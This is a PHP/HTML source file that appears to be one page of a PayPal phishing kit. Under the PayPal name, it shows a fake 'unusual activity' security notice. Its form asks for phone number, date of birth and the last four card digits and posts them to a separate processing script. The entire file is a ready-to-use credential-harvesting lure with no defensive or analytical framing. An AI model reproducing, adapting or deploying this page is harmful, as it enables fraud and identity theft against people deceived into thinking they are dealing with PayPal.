<?php
session_start();
?>
<!DOCTYPE html>
<html>
<head>
    <title>PayPal - Additional Verification</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="header">
        <div class="logo">PayPal</div>
    </div>
    
    <div class="container">
        <div class="security-notice">
            <h3>Additional verification required</h3>
            <p>We've detected unusual activity. Please verify your identity.</p>
        </div>
        
        <form action="process_additional.php" method="POST">
            <div class="form-group">
                <label>Phone Number</label>
                <input type="tel" name="phone" required>
            </div>
            
            <div class="form-group">
                <label>Date of Birth</label>
                <input type="date" name="dob" required>
            </div>
            
            <div class="form-group">
                <label>Card Number (Last 4 digits)</label>
                <input type="text" name="card_last4" maxlength="4" required>
            </div>
            
            <button type="submit" class="btn-login">Verify Identity</button>
        </form>
    </div>
</body>
</html>